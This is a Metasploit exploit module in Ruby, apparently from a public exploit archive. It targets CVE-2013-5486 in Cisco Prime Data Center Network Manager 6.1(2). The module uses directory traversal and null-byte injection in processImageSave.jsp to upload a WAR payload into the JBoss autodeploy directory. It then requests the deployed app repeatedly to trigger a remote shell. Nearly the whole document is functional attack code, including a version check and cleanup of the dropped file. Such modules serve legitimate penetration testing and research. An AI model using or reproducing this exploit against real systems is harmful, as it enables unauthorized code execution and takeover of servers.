 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Cisco Prime Data Center Network Manager Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
        This module exploits a code execution flaw in Cisco Data Center Network Manager. The
        vulnerability exists in processImageSave.jsp, which can be abused through a directory
        traversal and a null byte injection to upload arbitrary files. The autodeploy JBoss
        application server feature is used to achieve remote code execution. This module has been
        tested successfully on Cisco Prime Data Center Network Manager 6.1(2) on Windows 2008 R2
        (64 bits).
      },
      &#039;Author&#039;       =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2013-5486&#039;],
          [ &#039;OSVDB&#039;, &#039;97426&#039; ],
          [ &#039;ZDI&#039;, &#039;13-254&#039; ],
          [ &#039;URL&#039;, &#039;http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130918-dcnm&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;java&#039;,
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;Cisco DCNM 6.1(2) / Java Universal&#039;,
            {
              &#039;AutoDeployPath&#039; => "../../../../../deploy",
              &#039;CleanupPath&#039;    => "../../jboss-4.2.2.GA/server/fm/deploy"
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 18 2013&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to Cisco DCNM&#039;, &#039;/&#039;]),
        OptInt.new(&#039;ATTEMPTS&#039;, [true, &#039;The number of attempts to execute the payload (auto deployed by JBoss)&#039;, 10])
      ], self.class)
  end
 
  def upload_file(location, filename, contents)
    res = send_request_cgi(
      {
        &#039;uri&#039;         => normalize_uri(target_uri.path, "cues_utility", "charts", "processImageSave.jsp"),
        &#039;method&#039;      => &#039;POST&#039;,
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039;   =>
          {
            "mode"     => "save",
            "savefile" => "true",
            "chartid"  => "#{location}/#{filename}%00",
            "data"     => Rex::Text.uri_encode(Rex::Text.encode_base64(contents))
          }
      })
 
    if res and res.code == 200 and res.body.to_s =~ /success/
      return true
    else
      return false
    end
  end
 
  def check
    version = ""
 
    res = send_request_cgi({
      &#039;url&#039;    => target_uri.to_s,
      &#039;method&#039; => &#039;GET&#039;
    })
 
    unless res
      return Exploit::CheckCode::Unknown
    end
 
    if res.code == 200 and
        res.body.to_s =~ /Data Center Network Manager/ and
        res.body.to_s =~ /<div class="productVersion">Version: (.*)<\/div>/
      version = $1
      print_status("Cisco Primer Data Center Network Manager version #{version} found")
    elsif res.code == 200 and
        res.body.to_s =~ /Data Center Network Manager/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
 
    if version =~ /6\.1/
      return Exploit::CheckCode::Vulnerable
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    attempts = datastore[&#039;ATTEMPTS&#039;]
    fail_with(Failure::BadConfig, "#{peer} - Configure 1 or more ATTEMPTS") unless attempts > 0
 
    app_base = rand_text_alphanumeric(4+rand(32-4))
 
    # By default uploads land here: C:\Program Files\Cisco Systems\dcm\jboss-4.2.2.GA\server\fm\tmp\deploy\tmp3409372432509144123dcm-exp.war\cues_utility\charts
    # Auto deploy dir is here C:\Program Files\Cisco Systems\dcm\jboss-4.2.2.GA\server\fm\deploy
    # Sessions pwd is here C:\Program Files\Cisco Systems\dcm\fm\bin
    war = payload.encoded_war({ :app_name => app_base }).to_s
    war_filename = "#{app_base}.war"
    war_location = target[&#039;AutoDeployPath&#039;]
 
    print_status("#{peer} - Uploading WAR file #{war_filename}...")
    res = upload_file(war_location, war_filename, war)
 
    if res
      register_files_for_cleanup("#{target[&#039;CleanupPath&#039;]}/#{war_filename}")
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to upload the WAR payload")
    end
 
 
    attempts.times do
      select(nil, nil, nil, 2)
 
      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi(
        {
          &#039;uri&#039;    => normalize_uri(target_uri.path, app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
          &#039;method&#039; => &#039;GET&#039;
        })
      # Failure. The request timed out or the server went away.
      fail_with(Failure::TimeoutExpired, "#{peer} - The request timed out or the server went away.") if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end
  end
 
end

